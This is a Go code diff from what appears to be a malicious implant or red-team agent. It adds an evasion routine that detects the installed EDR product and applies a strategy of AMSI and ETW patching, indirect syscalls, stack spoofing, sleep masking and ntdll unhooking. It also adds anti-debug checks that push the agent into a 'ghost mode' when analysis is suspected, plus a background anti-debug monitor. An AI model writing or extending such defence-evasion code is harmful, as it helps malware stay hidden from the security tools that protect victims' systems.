@@ -69,7 +69,6 @@ func ApplyStrategy(s EvasionStrategy) {
 	patchAMSI = s.AMSIPatch
 	patchETW = s.ETWPatch
 	enableSleepMask = s.SleepMask
-	enableVEHUnhook = s.VEHUnhook
 
 	if Debug {
 		fmt.Printf("[EDR] Strategy: %s\n", s.Name)
@@ -95,4 +94,42 @@ func ApplyStrategy(s EvasionStrategy) {
 	if s.VEHUnhook {
 		unhookNtdll()
 	}
+}
+
+// ── Adaptive Evasion Flags ───────────────────────────────────────────────
+// Set by ApplyStrategy() from the detected-EDR strategy. All consumers are
+// in windows-tagged files (agent_windows, evasion_*, antidebug_windows), so
+// the declarations live here instead of the cross-platform types file.
+var (
+	useIndirectSyscall bool
+	useStackSpoofing   bool
+	pebBlockDLLs       bool
+	patchAMSI          bool
+	patchETW           bool
+	enableSleepMask    bool
+)
+
+// applyAdaptiveEvasion detects the active EDR, applies its evasion strategy
+// and runs the early anti-debug sweep. Extracted from main(): the flag writes
+// and AntiDebugCheck plumbing below only exist in windows builds, where this
+// whole path is meaningful (the !windows build stubs it as a plain EDR scan).
+func applyAdaptiveEvasion() {
+	edrInfo := DetectEDR()
+	strategy := edrInfo.GetStrategy()
+	ApplyStrategy(strategy)
+	if edrInfo.Detected && Debug {
+		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
+	}
+
+	score, details := AntiDebugCheck()
+	if score > 20 {
+		logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
+		if score > 50 {
+			enterGhostMode("anti-debug threshold exceeded")
+		} else {
+			patchAMSI = false
+			patchETW = false
+		}
+	}
+	go runAntiDebugMonitor()
 }
